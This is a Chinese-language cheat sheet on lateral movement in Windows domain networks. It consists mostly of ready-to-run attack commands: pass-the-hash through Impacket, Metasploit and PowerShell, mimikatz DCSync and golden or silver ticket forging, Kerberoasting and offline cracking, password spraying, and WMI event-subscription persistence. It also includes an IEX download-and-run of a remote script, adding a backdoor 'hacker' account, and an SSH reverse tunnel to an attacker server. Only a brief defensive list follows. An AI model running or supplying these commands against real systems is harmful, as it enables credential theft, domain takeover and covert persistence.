# 横向移动

横向移动是在获得内网某一主机权限后，以该主机为跳板进一步扩展权限、获取更多网络资源的过程。本文档涵盖常用横向移动技术和手法。

## 1 横向移动概述

```
横向移动流程:
├── 凭证传递
│   ├── Pass the Hash (PTH)
│   ├── Pass the Ticket (PTT)
│   ├── Pass the Password
│   └── 凭证重放
│
├── 远程执行
│   ├── WMI
│   ├── PSExec
│   ├── WinRM
│   ├── SSH
│   └── RDP
│
├── 域内移动
│   ├── 黄金票据
│   ├── 白银票据
│   ├── Kerberoasting
│   └── AS-REP Roasting
│
└── 数据窃取
    ├── 敏感文件
    └── 密码哈希
```

## 2 密码哈希传递 (Pass the Hash)

### 2.1 Impacket工具包

```bash
# 传递哈希 (PTH)
# WMIC
python wmiexec.py -hashes :<NTLM hash> domain/user@target_ip

# SMB
python psexec.py -hashes :<NTLM hash> domain/user@target_ip

# smbexec
python smbexec.py -hashes :<NTLM hash> domain/user@target_ip

# atexec (计划任务)
python atexec.py -hashes :<NTLM hash> domain/user@target_ip "command"

# dcomexec (DCOM)
python dcomexec.py -hashes :<NTLM hash> domain/user@target_ip
```

### 2.2 Metasploit中的PTH

```meterpreter
# 使用已获取的哈希
use exploit/windows/smb/psexec
set payload windows/meterpreter/bind_tcp
set RHOST target_ip
set SMBUser administrator
set SMBPass <NTLM hash>
run

# 或者使用sekurlsa::pth
meterpreter > hashdump
# 获取哈希后
mimikatz # sekurlsa::pth /user:administrator /domain:target.local /ntlm:<NTLM hash> /run:cmd.exe
```

### 2.3 PowerShell PTH

```powershell
# 使用 Invoke-SMBExec
# 需要先获取NTLM hash
$password = ConvertTo-SecureString "Placeholder" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($User, $password)
Invoke-SMBExec -Target target_ip -Command "net user hacker Pass123 /add" -Credential $cred -Hash <NTLM hash>

# 使用 WMI 执行
$wmi = Get-WmiObject -Class Win32_Process -Namespace root\cimv2 -Filter "Name='explorer.exe'"
Invoke-WmiMethod -InputObject $wmi -Name Create -ArgumentList "cmd.exe /c command"
```

## 4 黄金票据与白银票据

### 4.1 黄金票据 (Golden Ticket)

```cmd
# 获取KRBTGT哈希
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt

# 创建黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:<domain SID> /krbtgt:<KRBTGT NTLM hash> /ticket:golden.kirbi

# 注入票据
mimikatz # kerberos::ptt golden.kirbi

# 验证
mimikatz # kerberos::tgt
mimikatz # lsadump::dcsync /domain:target.local /user:administrator
```

### 4.2 白银票据 (Silver Ticket)

```cmd
# 获取目标服务账户哈希
# 常见服务SPN:
# CIFS (文件共享)
# HOST (RDP)
# RPCSS
# LDAP
# WSMAN (WinRM)

# 创建白银票据
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:<domain SID> /target:<target SPN> /rc4:<service NTLM hash> /ticket:silver.kirbi

# CIFS白银票据示例
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-xxx /target:cifs/fileserver.target.local /rc4:<NTLM hash> /ticket:silver.kirbi

# 注入票据
mimikatz # kerberos::ptt silver.kirbi

# 访问共享
dir \\fileserver.target.local\c$
```

### 4.3 黄金票据参数说明

```bash
# 参数详解
/user:Administrator      # 伪造的用户名（通常填 Administrator）
/domain:target.local     # 完整域名
/sid:S-1-5-21-xxx        # 域SID（可通过 whoami /user 获取）
/krbtgt:<hash>          # KRBTGT账户的NTLM哈希
/ticket:golden.kirbi     # 输出票据文件名

# 附加选项
/groups:512,513,518,519,520  # 设置票据组ID（默认域管）
/duration:600                # 票据有效期（分钟）
/aes256:<key>               # 使用AES256加密
```

## 5 Kerberoasting攻击

### 5.1 概述

Kerberoasting是通过请求Kerberos服务票据（TGS）并离线破解服务账户密码的攻击技术。

### 5.2 攻击步骤

```powershell
# PowerShell - 请求票据
Add-Type-assemblyname System.IdentityModel
# 或使用arset

# 使用 PowerView 请求票据
powershell -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')"
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# 请求服务票据
Request-SPNTicket -SPN "MSSQLSvc/dbserver.target.local:1433"

# 导出票据
mimikatz # kerberos::list /export
```

### 5.3 使用Rubeus

```bash
# Rubeus kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt

# 指定用户
Rubeus.exe kerberoast /user:service_account /outfile:hashes.txt

# 破解
hashcat -m 13100 hashes.txt wordlist.txt
```

## 7 WMI横向移动

### 7.1 命令执行

```powershell
# 本地执行命令 (需要Admin权限)
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc" -ComputerName target_ip

# 远程创建进程
$wmi = [WMICLass]"\\target_ip\root\cimv2:Win32_Process"
$wmi.Create("cmd.exe /c calc")

# 使用Invoke-Command (需要WinRM)
Invoke-Command -ComputerName target_ip -ScriptBlock { whoami }

# 交互式
Enter-PSSession -ComputerName target_ip
```

### 7.2 WMI事件订阅持久化

```powershell
# 创建事件订阅（可被用于横向移动和持久化）
$filterName = "SystemAudit"
$consumerName = "SystemAudit"
$command = "cmd.exe /c calc"

# 创建Filter
$null = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = $filterName
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}

# 创建Consumer
$null = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = $consumerName
    CommandLineTemplate = $command
}

# 绑定Filter和Consumer
$filter = Get-WMIObject -Namespace "root\subscription" -Class __EventFilter -Filter "Name='$filterName'"
$consumer = Get-WMIObject -Namespace "root\subscription" -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
$null = Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter;Consumer=$consumer}
```

## 8 PSExec横向移动

### 8.1 Metasploit PsExec

```meterpreter
# 使用psexec模块
use exploit/windows/smb/psexec
set RHOST target_ip
set SMBUser administrator
set SMBPass <password or hash>
set PAYLOAD windows/meterpreter/bind_tcp
run
```

### 8.2 Impacket PsExec

```bash
# Linux
python psexec.py domain/user:password@target_ip
python psexec.py -hashes :<NTLM hash> domain/user@target_ip

# Windows
psexec.exe \\target_ip -u domain\user -p password cmd.exe
psexec.exe \\target_ip -u domain\user -p password -c shell.exe
```

### 8.3 CrackMapExec

```bash
# 密码喷洒
crackmapexec smb target_ip -u users.txt -p passwords.txt

# 哈希传递
crackmapexec smb target_ip -u administrator -H <NTLM hash> -x "whoami"

# 批量执行
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM hash> -M mimikatz
```

## 10 SSH横向移动

### 10.1 SSH跳板

```bash
# 直接连接
ssh user@target_ip

# 密钥登录
ssh -i key.pem user@target_ip

# 通过跳板连接内网
ssh -J user@jump_server user@internal_host

# 端口转发后连接
ssh -L 8080:internal_host:80 user@jump_server
```

### 10.2 SSH隧道反向连接

```bash
# 在目标机器上执行 (反向隧道)
ssh -R 8080:localhost:22 user@attacker_server

# 在攻击者上连接
ssh user@localhost -p 8080
```

## 14 防御措施

```powershell
# 1. 限制管理员权限
#    - 本地管理员不使用同一密码
#    - 限制域管登录范围

# 2. 开启 SMB 签名
#    组策略 -> 安全设置 -> 本地策略 -> 安全选项 -> 微软网络客户端: 数字签名

# 3. 限制 NTLM 认证
#    启用扩展保护

# 4. 监控票据
#    启用 Kerberos 票据日志
#    监控异常TGS请求

# 5. 密码策略
#    强密码（20位以上）
#    定期更换
#    不重复使用

# 6. 最小权限原则
#    不要给普通用户高权限
#    限制服务账户权限

# 7. 网络隔离
#    分段管理
#    启用防火墙规则

# 8. 定期安全审计
#    BloodHound分析
#    权限审计
#    日志分析
```
